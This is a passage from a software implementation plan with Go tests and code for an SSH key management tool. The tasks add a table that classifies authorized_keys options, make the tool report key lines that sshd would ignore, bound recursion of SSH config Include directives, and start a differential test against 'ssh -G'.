	if opt, ok := FindOption([]string{"no-pty", `Expiry-Time="20270101"`}, "expiry-time"); !ok || opt != `Expiry-Time="20270101"` {
		t.Errorf("FindOption = %q, %v, want the option verbatim", opt, ok)
	}
}

func FuzzCheckOption(f *testing.F) {
	for _, s := range []string{"no-pty", `from="x"`, "zzz", `expiry-time="2027"`, "a=b=c", `command="\"x\""`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, opt string) {
		if CheckOption(opt) == "" {
			name, _, _ := strings.Cut(opt, "=")
			if _, ok := options[strings.ToLower(name)]; !ok {
				t.Errorf("accepted unknown option %q", opt)
			}
		}
		d, w := Loosening([]string{opt}, []string{opt})
		if len(d) != 0 || len(w) != 0 {
			t.Errorf("identical lines reported loosening for %q", opt)
		}
	})
}
```

- [ ] **Step 2: Run, expect FAIL** (compile error, undefined `CheckOption`…)

`go test ./internal/authkeys/ -run 'TestCheckOption|TestOptionIssue|TestLoosening|TestBlocksLoginAndCertOnly|TestExpiryTime'`

- [ ] **Step 3: Implement `options.go`**

```go
package authkeys

import (
	"errors"
	"fmt"
	"slices"
	"strings"
	"time"
)

type effect int

const (
	neutral   effect = iota // environment=, tunnel=: neither narrows nor widens login access
	restricts               // narrows access: dropping it widens access
	loosens                 // widens access: adding it widens access
)

// optionSpec is sshd(8)'s meaning of one authorized_keys option
// (AUTHORIZED_KEYS FILE FORMAT). sshd rejects the whole line on any option
// missing from this table, a valued option without a double-quoted value,
// or a bad expiry-time.
type optionSpec struct {
	takesValue bool
	effect     effect
	// underRestrict marks a re-enabler (pty, port-forwarding, …): it only
	// widens access on a line that also carries restrict; without restrict
	// the feature is already on.
	underRestrict bool
	// blocksLogin: can stop a non-interactive SSHepherd login outright.
	blocksLogin bool
	// certOnly: the line accepts only certificates the key signed, never the bare key.
	certOnly bool
	// value validates the unquoted value; nil accepts any.
	value func(string) error
}

var options = map[string]optionSpec{
	"agent-forwarding":    {effect: loosens, underRestrict: true},
	"cert-authority":      {effect: restricts, certOnly: true},
	"command":             {takesValue: true, effect: restricts, blocksLogin: true},
	"environment":         {takesValue: true},
	"expiry-time":         {takesValue: true, effect: restricts, blocksLogin: true, value: validExpiry},
	"from":                {takesValue: true, effect: restricts, blocksLogin: true},
	"no-agent-forwarding": {effect: restricts},
	"no-port-forwarding":  {effect: restricts},
	"no-pty":              {effect: restricts},
	"no-touch-required":   {effect: loosens}, // sk keys: no user-presence touch: a relaxation
	"no-user-rc":          {effect: restricts},
	"no-x11-forwarding":   {effect: restricts},
	"permitlisten":        {takesValue: true, effect: restricts},
	"permitopen":          {takesValue: true, effect: restricts},
	"port-forwarding":     {effect: loosens, underRestrict: true},
	"principals":          {takesValue: true, effect: restricts, certOnly: true},
	"pty":                 {effect: loosens, underRestrict: true},
	"restrict":            {effect: restricts, blocksLogin: true},
	"tunnel":              {takesValue: true},
	"user-rc":             {effect: loosens, underRestrict: true},
	"verify-required":     {effect: restricts}, // sk keys: PIN/biometric required
	"x11-forwarding":      {effect: loosens, underRestrict: true},
}

func lookup(opt string) (optionSpec, bool) {
	name, _, _ := strings.Cut(opt, "=")
	s, ok := options[strings.ToLower(name)]
	return s, ok
}

// CheckOption reports why one key option would make sshd reject the line;
// "" means acceptable. Unsafe runes are rejected first: option values are
// rendered verbatim into files and plan output.
func CheckOption(opt string) string {
	if strings.ContainsFunc(opt, IsUnsafeRune) {
		return "contains control or format characters"
	}
	_, value, hasValue := strings.Cut(opt, "=")
	s, known := lookup(opt)
	switch {
	case !known:
		return "is not a recognized authorized_keys option"
	case s.takesValue && (!hasValue || len(value) < 2 || value[0] != '"' || value[len(value)-1] != '"'):
		return `requires a quoted value (name="...")`
	case !s.takesValue && hasValue:
		return "does not take a value"
	case s.value != nil && s.value(value[1:len(value)-1]) != nil:
		return "has an invalid value (want YYYYMMDD[HHMM[SS]][Z])" // only expiry-time has a validator today
	}
	return ""
}

// OptionIssue returns the first option sshd would reject, as
// `option "<opt>" <issue>`; nil when every option is acceptable.
func OptionIssue(opts []string) error {
	for _, o := range opts {
		if issue := CheckOption(o); issue != "" {
			return fmt.Errorf("option %q %s", o, issue)
		}
	}
	return nil
}

// Loosening reports how rewriting a line from actual to desired options
// widens access. dropped: restrictive options actual carries that desired
// does not carry verbatim (a changed from= value counts). added: widening
// options desired adds; a re-enabler counts only when both lines carry
// restrict (otherwise it is a no-op, or dropping restrict is reported).
func Loosening(actual, desired []string) (dropped, added []string) {
	for _, o := range actual {
		if s, ok := lookup(o); ok && s.effect == restricts && !slices.Contains(desired, o) {
			dropped = append(dropped, o)
		}
	}
	restrictBoth := hasName(actual, "restrict") && hasName(desired, "restrict")
	for _, o := range desired {
		s, ok := lookup(o)
		if !ok || s.effect != loosens || slices.Contains(actual, o) || (s.underRestrict && !restrictBoth) {
			continue
		}
		added = append(added, o)
	}
	return dropped, added
}

// BlocksLogin reports whether any option can stop a non-interactive login
// outright (from=, command=, restrict, expiry-time=).
func BlocksLogin(opts []string) bool { return anySpec(opts, func(s optionSpec) bool { return s.blocksLogin }) }

// CertOnly reports whether the line accepts only certificates (cert-authority, principals=).
func CertOnly(opts []string) bool { return anySpec(opts, func(s optionSpec) bool { return s.certOnly }) }

// FindOption returns the first option named name (case-insensitive), verbatim.
func FindOption(opts []string, name string) (string, bool) {
	for _, o := range opts {
		n, _, _ := strings.Cut(o, "=")
		if strings.EqualFold(n, name) {
			return o, true
		}
	}
	return "", false
}

var errExpiry = errors.New("want YYYYMMDD[HHMM[SS]][Z]")

// ExpiryTime parses an expiry-time="…" option: sshd's YYYYMMDD[HHMM[SS]],
// in local unless suffixed Z (or z, as today's keyarg accepts) for UTC.
func ExpiryTime(opt string, local *time.Location) (time.Time, error) {
	_, v, _ := strings.Cut(opt, "=")
	return parseExpiry(strings.Trim(v, `"`), local)
}

func validExpiry(v string) error { _, err := parseExpiry(v, time.UTC); return err }

func parseExpiry(v string, loc *time.Location) (time.Time, error) {
	if strings.HasSuffix(v, "Z") || strings.HasSuffix(v, "z") {
		v, loc = v[:len(v)-1], time.UTC
	}
	layout, ok := map[int]string{8: "20060102", 12: "200601021504", 14: "20060102150405"}[len(v)]
	if !ok {
		return time.Time{}, errExpiry
	}
	t, err := time.ParseInLocation(layout, v, loc)
	if err != nil {
		return time.Time{}, errExpiry
	}
	return t, nil
}

func hasName(opts []string, name string) bool { _, ok := FindOption(opts, name); return ok }

func anySpec(opts []string, pred func(optionSpec) bool) bool {
	for _, o := range opts {
		if s, ok := lookup(o); ok && pred(s) {
			return true
		}
	}
	return false
}
```

- [ ] **Step 4: Run, expect PASS.** Same command, plus `go test -run '^$' -fuzz FuzzCheckOption -fuzztime 20s ./internal/authkeys/`.

Notes: every exported function has a caller reachable from `main` after Tasks 2–5, so `deadcode` stays green. Keep `options` unexported, so no new API surface leaks.

---

#### Task 2: config's allow-list becomes a thin call (Stream A)

**Files:** `internal/config/config.go` (204-250), `internal/config/config_test.go`.

> **D27 gate (review panel, testing).** D27 is asked **before W1 starts**, so the agent writes only one version of the tests. If D27 = (2) "keep loading", the P05 lane makes this complete diff instead of the one below: drop `value: validExpiry` from the `expiry-time` entry in `internal/authkeys/options.go`; change the two `TestCheckOption` rows `expiry-time="2027"` and `"2027xx01"` to expect `""`; do **not** add the `"bad expiry value"` config row; the integrator drops README delta #1 and P05's adopt comment says only "an unknown option" (no "or a bad expiry-time"). `make check` is then green with no follow-up commit.

- [ ] **Step 1: Failing test.** Add these rows to the existing option-error table next to `config_test.go:305-333`, in the same shape as the `"does not take a value"` row:

```go
// expiry-time with a value sshd cannot parse: sshd skips the line, so the manifest must not hold it.
{"bad expiry value", `users:
  - {name: alice, keys: ['expiry-time="2027" ` + testkeys.Line(t, 1) + `']}
`, "has an invalid value (want YYYYMMDD[HHMM[SS]][Z])"},
```

Also add `TestOptionAllowListIsAuthkeysTable`. It asserts that `optionIssue("verify-required") == ""`, that `optionIssue("no-ptty")` is the unchanged string `is not a recognized authorized_keys option`, and that the error for `zzz` still reads `user "alice" key 1: option "zzz" is not a recognized authorized_keys option` (README line 287 quotes this shape).

- [ ] **Step 2:** `go test ./internal/config/ -run 'Option'` should FAIL on the expiry row, because the manifest loads today.
- [ ] **Step 3: Implement.** Delete `keyOptions` and the body of `optionIssue`, and keep the name, because `fuzz_test.go:91` uses it:

```go
// optionIssue reports why one key option is unsafe or unknown to sshd; empty
// means acceptable. The meaning table lives in authkeys (one model for
// manifest validation, apply's loosening highlight and rotate's expiry check).
func optionIssue(opt string) string { return authkeys.CheckOption(opt) }
```

The loop at `config.go:191-195` stays byte-identical, so error text does not change.
- [ ] **Step 4:** `go test -race ./internal/config/` should PASS, and so should `go test -run '^$' -fuzz FuzzParse -fuzztime 20s ./internal/config/` (the target name is whatever `internal/config/fuzz_test.go` declares; check before running).

**Owner check (ask once, before merge, in plain words):** *"A manifest key with a broken `expiry-time` (like `"2027"`) would now fail to load, the same as an unknown option. sshd already skips that line, so the key never worked. OK?"* My recommendation is **yes**. If the owner says no, drop the `value: validExpiry` field from the `expiry-time` entry. rotate still reports the bad value through `ExpiryTime`.

---

#### Task 3: apply derives restriction logic from the table (fixes COR-4) (Stream A)

**Files:** `internal/apply/plan.go` (`RewriteRow` 47-60, `rewriteRows` 274, `certOnly` 518-527, `droppedRestrictions`/`isRestriction` 528-553, `hasRestrictiveOption` 575-588), `internal/apply/plan_test.go`.

- [ ] **Step 1: Failing test.** Append to `plan_test.go`:

```go
// COR-4: FIDO options are classified by meaning, and added relaxations are seen.
func TestPlanRewriteLooseningByMeaning(t *testing.T) {
	tests := []struct {
		name, manifestOpts, serverOpts string
		wantLoosens, wantWidens        []string
	}{
		{"verify-required dropped", "", "verify-required ", []string{"verify-required"}, nil},
		{"no-touch-required dropped is tightening", "", "no-touch-required ", nil, nil},
		{"no-touch-required added", "no-touch-required ", "", nil, []string{"no-touch-required"}},
		{"port-forwarding added under restrict", "restrict,port-forwarding ", "restrict ", nil, []string{"port-forwarding"}},
		{"pty added without restrict is a no-op", "pty ", "", nil, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg, err := config.Parse([]byte(`
users:
  - {name: op, operator: true, keys: ["` + testkeys.Line(t, 1) + `"]}
  - {name: bob, keys: ["` + tt.manifestOpts + testkeys.Line(t, 3) + `"]}
servers:
  - {name: web-1, host: 10.0.0.1, user: deploy}
access:
  - {user: bob, servers: [web-1]}
`))
			if err != nil {
				t.Fatalf("config: %v", err)
			}
			content := testkeys.Line(t, 1) + "\n" + tt.serverOpts + testkeys.Line(t, 3) + "\n"
			r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: []byte(content)}}}
			p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
			if len(p.Rewrites) != 1 {
				t.Fatalf("Rewrites = %+v, want bob's options rewrite", p.Rewrites)
			}
			rw := p.Rewrites[0]
			if strings.Join(rw.Loosens, "|") != strings.Join(tt.wantLoosens, "|") ||
				strings.Join(rw.Widens, "|") != strings.Join(tt.wantWidens, "|") {
				t.Errorf("Loosens=%q Widens=%q, want %q / %q", rw.Loosens, rw.Widens, tt.wantLoosens, tt.wantWidens)
			}
		})
	}
}
```

Delete `TestDroppedRestrictions` (`plan_test.go:446-463`). Its rows moved to `authkeys.TestLoosening` in Task 1. Keep `TestHasRestrictiveOption` (500-518) **unchanged**: it is the guard that the derived `hasRestrictiveOption` behaves exactly as before.

- [ ] **Step 2:** `go test ./internal/apply/ -run 'TestPlanRewriteLooseningByMeaning|TestHasRestrictiveOption|TestPlanRewriteOptions'` should FAIL. `Widens` is undefined, and once it compiles, `verify-required` is missing and `no-touch-required` is wrongly flagged.
- [ ] **Step 3: Implement.**

```go
	// Loosens lists restrictive on-server options the rewrite drops (from=,
	// command=, restrict, the no-* restrictions, verify-required,
	// expiry-time=, permitopen=, permitlisten=, cert-authority, principals=).
	Loosens []string
	// Widens lists relaxing options the rewrite adds (no-touch-required;
	// pty/port-/agent-/X11-forwarding/user-rc when both lines carry restrict).
	// Together with Loosens: the key gains access it does not have today.
	Widens []string
```

```go
		if row.OptionsDiffer {
			row.Loosens, row.Widens = authkeys.Loosening(actual.Options, e.Key.Options)
		}
```

```go
func certOnly(options []string) bool { return authkeys.CertOnly(options) }

// hasRestrictiveOption: options that can stop a future non-interactive
// SSHepherd login outright (see authkeys.BlocksLogin). Name kept: exec.go
// orders probe survivors with it.
func hasRestrictiveOption(options []string) bool { return authkeys.BlocksLogin(options) }
```

Delete `droppedRestrictions` and `isRestriction`. `slices` stays imported because `rewriteRows` uses `slices.Equal`.
- [ ] **Step 4:** `go test -race ./internal/apply/` should PASS. **Golden check:** `go test ./internal/apply/ -run Golden` must pass **without** `-update`. No current golden contains `verify-required`, `no-touch-required` or a `*-forwarding` option (checked with `grep -rl` over `internal/*/testdata`), so no golden should move. If one does, stop and report it to the integrator. P07 owns `internal/apply/testdata/*` in this wave.

**H1 (moved to P07 Task 8 by the review panel).** `report.go` and `json.go` belong to P07, so the `Widens` rendering is now a P07 lane task with its own failing test, coded against the frozen field `RewriteRow.Widens []string` that this task adds. The integrator only merges.

---

#### Task 4: rotate's expiry check uses the table (Stream A)

**Files:** `cmd/sshepherd/keyarg.go` (266-297), `cmd/sshepherd/keyarg_test.go`.

- [ ] **Step 1: Guard test** (a refactor, so the existing `TestExpiry` at `keyarg_test.go:168-195` is the regression net). Add a test that pins agreement with the manifest rule:

```go
// expiryPassed and the manifest loader accept exactly the same expiry values.
func TestExpiryAgreesWithManifestRule(t *testing.T) {
	now := time.Date(2026, 10, 23, 12, 0, 0, 0, time.UTC)
	for _, v := range []string{"20270101", "202701011200", "20270101120000Z", "2027", "2027xx01", "20271301", "202701011200z"} {
		opt := `expiry-time="` + v + `"`
		_, err := expiryPassed(opt, now)
		if (err == nil) != (authkeys.CheckOption(opt) == "") {
			t.Errorf("%s: expiryPassed err=%v but CheckOption=%q", opt, err, authkeys.CheckOption(opt))
		}
	}
}
```

- [ ] **Step 2:** `go test ./cmd/sshepherd/ -run 'TestExpiry'` PASSES before the change (both copies agree today). That is expected for a refactor. The test exists to catch future drift.
- [ ] **Step 3: Implement.** Keep both signatures, because `rotate.go:166-168` calls them:

```go
func expiryOption(options []string) string {
	o, _ := authkeys.FindOption(options, "expiry-time")
	return o
}

func expiryPassed(option string, now time.Time) (bool, error) {
	t, err := authkeys.ExpiryTime(option, time.Local)
	if err != nil {
		return false, fmt.Errorf("cannot read %s (want YYYYMMDD[HHMM[SS]][Z])", option)
	}
	return !t.After(now), nil
}
```

- [ ] **Step 4:** `go test -race ./cmd/sshepherd/ -run 'TestExpiry|TestRotate'` should PASS.

---

#### Task 5: adopt survives lines sshd would ignore (fixes COR-1 and TST-2) (Stream A)

**Files:** `internal/adopt/adopt.go` (Issue doc 34-41, `Build` loop 79-114), `internal/adopt/adopt_test.go`, `cmd/sshepherd/adopt_options_test.go` (new).

- [ ] **Step 1a: Failing unit test** (`internal/adopt/adopt_test.go`):

```go
// A found key whose options sshd rejects never logs in: it is an Issue (strict
// gate / --partial), never an adopted user or an access extension.
func TestBuildBadOptionLineIsAnIssue(t *testing.T) {
	for _, prefix := range []string{"zzz ", "no-ptty ", "from=1.2.3.4 "} {
		t.Run(prefix, func(t *testing.T) {
			cfg := testCfg(t)
			op := testkeys.Line(t, 1)
			bad := prefix + testkeys.Line(t, 7) + " carol@laptop"
			good := testkeys.Line(t, 8) + " dave@x"
			r := &fakeReader{byName: map[string]audit.ReadResult{
				"db-1":  {Content: []byte(op + "\n" + bad + "\n" + good + "\n")},
				"web-1": {Content: []byte(op + "\n")},
				"web-2": {Content: []byte(op + "\n")},
			}}
			p := Build(cfg, runAudit(t, cfg, r))
			if len(p.Issues) != 1 || p.Issues[0].Server != "db-1" ||
				!strings.Contains(p.Issues[0].Detail, "sshd ignores this line: option ") {
				t.Fatalf("Issues = %+v, want one 'sshd ignores this line' issue on db-1", p.Issues)
			}
			if len(p.NewUsers) != 1 || p.NewUsers[0].Name != "dave-x" {
				t.Errorf("NewUsers = %+v, want only dave-x (the bad line is not adopted)", p.NewUsers)
			}
		})
	}
}

// A known user's key on a line sshd ignores is not access: no extension.
func TestBuildBadOptionKnownKeyNotExtended(t *testing.T) {
	cfg := extCfg(t) // existing helper (adopt_test.go:264): alice granted web-1 only
	op, al := testkeys.Line(t, 1), testkeys.Line(t, 2)
	r := &fakeReader{byName: map[string]audit.ReadResult{
		"db-1":  {Content: []byte(op + "\n" + "zzz " + al + "\n")}, // outside alice's grants, line sshd ignores
		"web-1": {Content: []byte(op + "\n" + al + "\n")},          // granted: not an extension
		"web-2": {Content: []byte(op + "\n")},
	}}
	p := Build(cfg, runAudit(t, cfg, r))
	if len(p.Extensions) != 0 {
		t.Errorf("Extensions = %+v, want none (sshd ignores the db-1 line, so it grants nothing)", p.Extensions)
	}
	if len(p.Issues) != 1 || p.Issues[0].Server != "db-1" ||
		!strings.Contains(p.Issues[0].Detail, "sshd ignores this line: option ") {
		t.Errorf("Issues = %+v, want one 'sshd ignores this line' issue on db-1", p.Issues)
	}
	if len(p.NewUsers) != 0 {
		t.Errorf("NewUsers = %+v, want none (the key is alice's)", p.NewUsers)
	}
}
```

- [ ] **Step 1b: Failing CLI test** (`cmd/sshepherd/adopt_options_test.go`). It drives the real binary path against the in-process server:

```go
package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn/sshtest"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// COR-1/TST-2: one server line sshd would ignore used to fail adopt's
// self-check ("bug: generated manifest fails validation", exit 3) even
// under --partial. It is now an unreadable-line issue: strict exit 1,
// --partial writes a valid manifest without that line.
func TestAdoptServerLineWithBadOption(t *testing.T) {
	for _, prefix := range []string{"no-ptty ", "from=1.2.3.4 "} {
		t.Run(strings.TrimSpace(prefix), func(t *testing.T) {
			home := shortHome(t)
			srv, hostKey, cfg := hermeticFleet(t, home)
			ak := filepath.Join(home, ".ssh", "authorized_keys")
			f, err := os.OpenFile(ak, os.O_APPEND|os.O_WRONLY, 0o600)
			if err != nil {
				t.Fatal(err)
			}
			_, _ = f.WriteString(prefix + testkeys.Line(t, 7) + " carol@laptop\n")
			_ = f.Close()
			kh := sshtest.KnownHostsFile(t, srv.KnownHostsLine(hostKey))

			var out, errBuf bytes.Buffer
			code := run([]string{"adopt", "--config", cfg, "--known-hosts", kh}, &out, &errBuf)
			if code != 1 || strings.Contains(errBuf.String(), "bug:") {
				t.Fatalf("strict exit = %d, want 1 without 'bug:'\nstderr: %s", code, errBuf.String())
			}
			if !strings.Contains(errBuf.String(), "sshd ignores this line: option ") || out.Len() != 0 {
				t.Errorf("stderr = %q stdout = %q, want the issue and no manifest", errBuf.String(), out.String())
			}

			for _, extra := range [][]string{nil, {"--merge"}} {
				out.Reset()
				errBuf.Reset()
				args := append([]string{"adopt", "--config", cfg, "--known-hosts", kh, "--partial"}, extra...)
				if code := run(args, &out, &errBuf); code != 0 {
					t.Fatalf("%v exit = %d, want 0\nstderr: %s", args, code, errBuf.String())
				}
				if _, err := config.Parse(out.Bytes()); err != nil {
					t.Errorf("%v: stdout is not a valid manifest: %v", args, err)
				}
				if strings.Contains(out.String(), "carol") {
					t.Errorf("%v: the ignored line was adopted:\n%s", args, out.String())
				}
			}
		})
	}
}
```

- [ ] **Step 2:** `go test ./internal/adopt/ -run BadOption` and `go test ./cmd/sshepherd/ -run TestAdoptServerLineWithBadOption` should FAIL. The unit test gets no Issue and carol is adopted; the CLI test gets exit 3 with `bug: generated manifest fails validation`.
- [ ] **Step 3: Implement.** Put this at the top of the `for _, k := range r.Diff.Unauthorized` loop in `adopt.go:86`, before owner attribution, so a known key on an ignored line is never extended:

```go
			// sshd rejects a line with an unknown option, an unquoted value
			// or a bad expiry-time, so this key never logged in here. Adopting
			// it would fail the manifest's own validation (the generated
			// manifest is self-checked); report it like an unparseable line
			// so the strict gate / --partial decide. err quotes the option
			// with %q, so remote control bytes are escaped.
			if err := authkeys.OptionIssue(k.Options); err != nil {
				p.Issues = append(p.Issues, Issue{Server: r.Server.Name,
					Detail: fmt.Sprintf("key %s: sshd ignores this line: %v", k.Fingerprint, err)})
				continue
			}
```

Update the `Issue` doc comment: *"Issue is a server whose keys could not be (fully) read, or that holds a line sshd ignores; the cmd layer enforces the strict/--partial gate on these."* Do not touch `cmd/sshepherd/adopt.go`; P06 owns it. The `bug:` self-check stays as a safety net.
- [ ] **Step 4:** `go test -race ./internal/adopt/ ./cmd/sshepherd/` should PASS. Also check that the adopt goldens (`cmd/sshepherd/testdata/adopt_*.golden`) are unchanged without `-update`.

Expected stderr line (README copies it from real output): `server web-1: key SHA256:…: sshd ignores this line: option "no-ptty" is not a recognized authorized_keys option`. The integrator copies the exact fingerprint from a real run.

---

#### Task 6: Bounded Include in sshcfg (fixes SEC-4) (Stream B)

**Files:** `internal/sshcfg/sshcfg.go` (parser 59-76, `parseFile` 105-112, `include` 303-341), `internal/sshcfg/sshcfg_test.go`.

- [ ] **Step 1: Failing tests** (`sshcfg_test.go`):

```go
// SEC-4: mutually self-including fragments end fast with a bounded number
// of warnings (today: 2^16 parses and ~196k warnings; with 3 fragments, a hang).
func TestIncludeCycleSkipped(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"config":      "Include " + filepath.Join(dir, "frag", "*.conf") + "\n",
		"frag/a.conf": "Host a\n  User u\n  Include " + filepath.Join(dir, "frag", "*.conf") + "\n",
		"frag/b.conf": "Host b\n  User v\n  Include " + filepath.Join(dir, "frag", "*.conf") + "\n",
	}
	for name, c := range files {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	start := time.Now()
	hosts, warnings := loadDir(t, dir)
	if d := time.Since(start); d > time.Second {
		t.Errorf("load took %v, want < 1s", d)
	}
	if len(hosts) != 2 || hosts[0].Alias != "a" || hosts[1].Alias != "b" {
		t.Errorf("hosts = %+v, want [a b]", hosts)
	}
	if len(warnings) > 8 || !hasWarning(warnings, "Include cycle") {
		t.Errorf("warnings (%d) = %v, want a few 'Include cycle' warnings", len(warnings), warnings)
	}
}

func TestIncludeCycleThroughSymlink(t *testing.T) {
	dir := writeFiles(t, map[string]string{"config": "Include link\nHost a\n  User u\n"})
	if err := os.Symlink(filepath.Join(dir, "config"), filepath.Join(dir, "link")); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	_, warnings := loadDir(t, dir)
	if !hasWarning(warnings, "Include cycle") {
		t.Errorf("warnings = %v, want the symlinked self-include seen as a cycle", warnings)
	}
}

func TestIncludeReadBudget(t *testing.T) {
	files := map[string]string{"config": "Include conf.d/*\n"}
	for i := range maxIncludeReads + 10 {
		files[fmt.Sprintf("conf.d/%05d", i)] = fmt.Sprintf("Host h%d\n  User u\n", i)
	}
	hosts, warnings := loadDir(t, writeFiles(t, files))
	if len(hosts) != maxIncludeReads || !hasWarning(warnings, "Include file reads") {
		t.Errorf("hosts = %d, warnings = %v, want %d hosts and one budget warning", len(hosts), warnings, maxIncludeReads)
	}
}

func TestIncludeSizeCap(t *testing.T) {
	big := "Host big\n  User u\n" + strings.Repeat("#", maxIncludeBytes)
	hosts, warnings := loadDir(t, writeFiles(t, map[string]string{"config": "Include big\nHost a\n", "big": big}))
	if len(hosts) != 1 || hosts[0].Alias != "a" || !hasWarning(warnings, "larger than") {
		t.Errorf("hosts = %+v, warnings = %v, want the oversized include skipped", hosts, warnings)
	}
}

// A non-cyclic chain deeper than OpenSSH's cap still stops at the depth cap.
func TestIncludeDepthCapNonCyclic(t *testing.T) {
	files := map[string]string{"config": "Include f0\n"}
	for i := range maxIncludeDepth + 2 {
		files[fmt.Sprintf("f%d", i)] = fmt.Sprintf("Host h%d\nInclude f%d\n", i, i+1)
	}
	_, warnings := loadDir(t, writeFiles(t, files))
	if !hasWarning(warnings, "depth") {
		t.Errorf("warnings = %v, want a depth-cap warning", warnings)
	}
}
```

Change `TestIncludeDepthCapTerminates` (`sshcfg_test.go:432-442`). Its self-including `config` is now a **cycle**, so it should expect `hasWarning(warnings, "Include cycle")` instead of `"depth"`, and still exactly one host `a`. Add `"fmt"` and `"time"` to the imports.

- [ ] **Step 2:** `go test ./internal/sshcfg/ -run 'TestInclude' -timeout 60s` should FAIL. The cycle test takes several seconds and produces about 196k warnings, `maxIncludeReads`/`maxIncludeBytes` are undefined, and the symlink case produces only a depth warning.
- [ ] **Step 3: Implement.**

```go
const (
	maxIncludeDepth = 16      // mirrors OpenSSH's cap on nested Include
	maxIncludeReads = 1024    // total included-file reads per Load
	maxIncludeBytes = 1 << 20 // per included file
)

type parser struct {
	// ...existing fields...
	chain       []string        // canonical paths of files being parsed, outermost first
	reads       int             // included files read so far
	budgetWarned bool
	cycleWarned map[string]bool // "from:line -> target" already warned
}

// canonical resolves symlinks so a cycle through a link is still a cycle;
// a path that cannot be resolved falls back to its cleaned absolute form.
func canonical(path string) string {
	if abs, err := filepath.Abs(path); err == nil {
		path = abs
	}
	if real, err := filepath.EvalSymlinks(path); err == nil {
		return real
	}
	return filepath.Clean(path)
}

// readCapped reads at most limit bytes; a larger file is an error.
func readCapped(path string, limit int) ([]byte, error) {
	f, err := os.Open(path) // #nosec G304 -- path comes from the user's own config/Include
	if err != nil {
		return nil, fmt.Errorf("open: %w", err)
	}
	defer func() { _ = f.Close() }()
	data, err := io.ReadAll(io.LimitReader(f, int64(limit)+1))
	if err != nil {
		return nil, fmt.Errorf("read: %w", err)
	}
	if len(data) > limit {
		return nil, fmt.Errorf("larger than %d bytes", limit)
	}
	return data, nil
}
```

In `parseFile`, set `p.chain = []string{canonical(path)}` before `parseBytes`. Replace the loop in `include`:

```go
	for _, m := range matches {
		c := canonical(m)
		if slices.Contains(p.chain, c) {
			// OpenSSH has no cycle check (it dies at depth 16); re-reading a
			// file already on the chain adds nothing and is exponential with
			// several self-including fragments.
			key := fmt.Sprintf("%s:%d -> %s", fromPath, line, c)
			if !p.cycleWarned[key] {
				if p.cycleWarned == nil {
					p.cycleWarned = make(map[string]bool)
				}
				p.cycleWarned[key] = true
				p.warnf("%s:%d: Include cycle: %s is already being read, skipping", fromPath, line, m)
			}
			continue
		}
		if p.reads >= maxIncludeReads {
			if !p.budgetWarned {
				p.budgetWarned = true
				p.warnf("%s:%d: more than %d Include file reads, skipping the rest", fromPath, line, maxIncludeReads)
			}
			return
		}
		p.reads++
		data, err := readCapped(m, maxIncludeBytes)
		if err != nil {
			p.warnf("%s:%d: Include %s: unreadable: %v", fromPath, line, m, err)
			continue
		}
		p.chain = append(p.chain, c)
		p.parseIncluded(data, m, fromPath, line, depth+1)
		p.chain = p.chain[:len(p.chain)-1]
	}
```

Every `Include` warning is now worded so the README quotes it word for word. A directory include still warns `unreadable` (`io.ReadAll` on a directory fails), so `TestIncludeDirectoryWarns` (421) stays green. The fuzz harness (`fuzz_test.go:22-24`) calls `parseBytes` directly with an empty chain and a stub glob, so it still works unchanged.
- [ ] **Step 4:** `go test -race ./internal/sshcfg/` should PASS, and so should `go test -run '^$' -fuzz FuzzParse -fuzztime 30s ./internal/sshcfg/`.

Diamonds (two fragments that both include `common.conf`) are **not** cycles and are still parsed twice, which matches OpenSSH. Only the current chain is checked.

---

#### Task 7: Differential test against `ssh -G` (fixes TST-10) (Stream B, after Task 6)

**Files:** `internal/sshcfg/sshcfg_test.go` (hoist two tables), `internal/sshcfg/sshg_diff_test.go` (new).

- [ ] **Step 1: Hoist the fixtures.** Move the table in `TestLoadResolution` (36-226) into a package-level `var loadResolutionCases = []resolutionCase{…}`, and the table in `TestIncludeRestoresContext` (343-408) plus the `TestIncludeInsideHostBlock` fixture into `var includeContextCases = []includeCase{…}`. Each struct gains one field: `sshG string // "" = ssh -G agrees; else why sshcfg differs on purpose`. The original tests loop over the vars, so their behavior does not change.
- [ ] **Step 2: Write the diff test** (`sshg_diff_test.go`):

```go
package sshcfg

import (
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
)

// sshG returns `ssh -G -F cfg alias` as key -> values (identityfile repeats).
// -F makes ssh skip /etc/ssh/ssh_config, so only the fixture is read.
func sshG(t *testing.T, bin, cfg, alias string) (map[string][]string, error) {
	t.Helper()
	out, err := exec.CommandContext(t.Context(), bin, "-G", "-F", cfg, alias).Output() // #nosec G204 -- test-only: fixed ssh binary, fixture args
	if err != nil {
		return nil, err //nolint:wrapcheck // test helper
	}
	m := map[string][]string{}
	for _, l := range strings.Split(string(out), "\n") {
		if k, v, ok := strings.Cut(l, " "); ok {
			m[k] = append(m[k], v)
		}
	}
	return m, nil
}

// diffHost lists where sshcfg's resolution of h disagrees with ssh -G.
func diffHost(h Host, g map[string][]string, me *user.User) []string {
	var d []string
	first := func(k string) string { if v := g[k]; len(v) > 0 { return v[0] }; return "" }
	if !strings.EqualFold(h.HostName, first("hostname")) {
		d = append(d, "hostname "+h.HostName+" vs "+first("hostname"))
	}
	wantUser := h.User
	if wantUser == "" {
		wantUser = me.Username
	}
	if wantUser != first("user") {
		d = append(d, "user "+wantUser+" vs "+first("user"))
	}
	wantPort := h.Port
	if wantPort == 0 {
		wantPort = 22
	}
	if strconv.Itoa(wantPort) != first("port") {
		d = append(d, "port "+strconv.Itoa(wantPort)+" vs "+first("port"))
	}
	// Only literal identities: tokens are import's job (identity package),
	// and with none set ssh lists its defaults.
